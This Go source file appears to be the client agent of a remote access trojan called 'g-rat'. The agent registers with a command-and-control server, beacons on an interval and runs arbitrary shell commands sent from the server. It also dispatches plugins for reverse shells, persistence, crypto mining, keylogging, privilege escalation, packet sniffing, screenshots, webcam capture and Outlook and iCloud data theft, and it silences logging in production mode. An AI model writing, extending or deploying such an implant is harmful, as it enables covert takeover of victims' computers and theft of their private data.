package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
	"io"
	"io/ioutil"
	"net"

	"github.com/matishsiao/goInfo"
	"github.com/sevil11/g-rat/agent/plugins"
	"github.com/sevil11/g-rat/shared"
)

var (
	serverURL = flag.String("server", "http://localhost:8080", "C2 server URL")
	interval  = flag.Int("interval", 60, "Beacon interval in seconds")
	agentID   = flag.String("id", "", "Agent ID (empty for auto-generation)")
	debug     = flag.Bool("debug", false, "Enable debug logging")
	version   = "1.0.0"
)

// Initialize agent state
var (
	systemInfo shared.SystemInfo
	currentAgentID string
	taskHandlers = map[string]func(task shared.Task) shared.Result{
		shared.TaskTypeShell:          handleShellCommand,
		shared.TaskTypeReverseShell:   plugins.HandleReverseShell,
		shared.TaskTypePersistence:    plugins.HandlePersistence,
		shared.TaskTypeMiner:          plugins.HandleMiner,
		shared.TaskTypeKeylogger:      plugins.HandleKeylogger,
		shared.TaskTypeEscalate:       plugins.HandleEscalate,
		shared.TaskTypePacketSniffer:  plugins.HandlePacketSniffer,
		shared.TaskTypeScreenshot:     plugins.HandleScreenshot,
		shared.TaskTypeWebcam:         plugins.HandleWebcam,
		shared.TaskTypePortScan:       plugins.HandlePortScan,
		shared.TaskTypeProcessControl: plugins.HandleProcessControl,
		shared.TaskTypeOutlook:        plugins.HandleOutlook,
		shared.TaskTypeICloud:         plugins.HandleICloud,
	}
)

func main() {
	flag.Parse()
	
	// Setup logging
	if *debug {
		log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
	} else {
		// Discard logs in production mode
		log.SetOutput(ioutil.Discard)
	}
	
	fmt.Println("[Agent] BYOB-style agent starting...")
	
	// Collect system information
	if err := collectSystemInfo(); err != nil {
		log.Printf("Error collecting system info: %v", err)
	}
	
	// Register with C2 server
	if err := registerAgent(); err != nil {
		log.Printf("Error registering agent: %v", err)
		// In a real RAT, we'd implement retry logic
	}
	
	// Main agent loop
	for {
		// Check for tasks
		task, err := fetchTask()
		if err != nil {
			log.Printf("Error fetching task: %v", err)
		} else if task.ID != "" {
			// Process task
			result := processTask(task)
			
			// Send result back to C2
			if err := sendResult(result); err != nil {
				log.Printf("Error sending result: %v", err)
			}
		}
		
		// Send beacon
		if err := sendBeacon(); err != nil {
			log.Printf("Error sending beacon: %v", err)
		}
		
		// Wait for next interval
		time.Sleep(time.Duration(*interval) * time.Second)
	}
}

// collectSystemInfo gathers information about the host system
func collectSystemInfo() error {
	gi, err := goInfo.GetInfo()
	if err != nil {
		return err
	}
	
	hostname, _ := os.Hostname()
	username := "unknown"
	if u, err := getUserInfo(); err == nil {
		username = u
	}
	
	systemInfo = shared.SystemInfo{
		Hostname:     hostname,
		InternalIP:   getLocalIP(),
		ExternalIP:   "", // Would fetch from an external service
		OS:           gi.OS,
		Architecture: gi.Core,
		Username:     username,
		UID:          "", // Would get user ID
		Uptime:       gi.Uptime,
	}
	
	return nil
}

// getUserInfo gets the current username
func getUserInfo() (string, error) {
	if runtime.GOOS == "windows" {
		return os.Getenv("USERNAME"), nil
	} else {
		return os.Getenv("USER"), nil
	}
}

// getLocalIP gets the primary non-loopback IP address
func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, address := range addrs {
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}

// registerAgent registers with the C2 server
func registerAgent() error {
	agent := shared.Agent{
		ID:           *agentID,
		SystemInfo:   systemInfo,
		IP:           getLocalIP(),
		Version:      version,
		Capabilities: getCapabilities(),
	}
	
	data, err := json.Marshal(agent)
	if err != nil {
		return err
	}
	
	resp, err := http.Post(*serverURL+"/api/register", "application/json", bytes.NewBuffer(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	var regResp struct {
		AgentID string `json:"agent_id"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&regResp); err != nil {
		return err
	}
	
	currentAgentID = regResp.AgentID
	log.Printf("Registered with server as agent: %s", currentAgentID)
	return nil
}

// getCapabilities returns the list of supported plugins
func getCapabilities() []string {
	capabilities := make([]string, 0, len(taskHandlers))
	for taskType := range taskHandlers {
		capabilities = append(capabilities, taskType)
	}
	return capabilities
}

// fetchTask gets the next task from the C2 server
func fetchTask() (shared.Task, error) {
	var task shared.Task
	
	resp, err := http.Get(fmt.Sprintf("%s/api/task?agent_id=%s", *serverURL, currentAgentID))
	if err != nil {
		return task, err
	}
	defer resp.Body.Close()
	
	if err := json.NewDecoder(resp.Body).Decode(&task); err != nil {
		return task, err
	}
	
	if task.ID != "" {
		log.Printf("Received task: %s (%s)", task.ID, task.Type)
	}
	
	return task, nil
}

// processTask handles a task from the C2 server
func processTask(task shared.Task) shared.Result {
	// Prepare result structure
	result := shared.Result{
		TaskID:     task.ID,
		AgentID:    currentAgentID,
		StartTime:  time.Now(),
		ExitCode:   0,
	}
	
	// Find and execute handler for task type
	if handler, ok := taskHandlers[task.Type]; ok {
		log.Printf("Executing task handler for type: %s", task.Type)
		result = handler(task)
	} else {
		result.Error = fmt.Sprintf("unsupported task type: %s", task.Type)
		result.ExitCode = 1
	}
	
	result.FinishTime = time.Now()
	return result
}

// handleShellCommand executes a shell command
func handleShellCommand(task shared.Task) shared.Result {
	result := shared.Result{
		TaskID:    task.ID,
		AgentID:   currentAgentID,
		StartTime: time.Now(),
	}
	
	// Determine which shell to use
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", task.Command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", task.Command)
	}
	
	// Capture command output
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	
	// Run the command
	err := cmd.Run()
	
	// Populate result
	result.Output = stdout.String()
	result.Error = stderr.String()
	
	if err != nil {
		if exitError, ok := err.(*exec.ExitError); ok {
			result.ExitCode = exitError.ExitCode()
		} else {
			result.ExitCode = 1
			result.Error += "\n" + err.Error()
		}
	}
	
	result.FinishTime = time.Now()
	return result
}

// sendResult sends a task result back to the C2 server
func sendResult(result shared.Result) error {
	data, err := json.Marshal(result)
	if err != nil {
		return err
	}
	
	resp, err := http.Post(*serverURL+"/api/results", "application/json", bytes.NewBuffer(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("unexpected status code: %d", resp.StatusCode)
	}
	
	log.Printf("Sent result for task: %s", result.TaskID)
	return nil
}

// sendBeacon sends a heartbeat to the C2 server
func sendBeacon() error {
	data, err := json.Marshal(map[string]string{"agent_id": currentAgentID})
	if err != nil {
		return err
	}
	
	resp, err := http.Post(*serverURL+"/api/beacon", "application/json", bytes.NewBuffer(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	return nil
}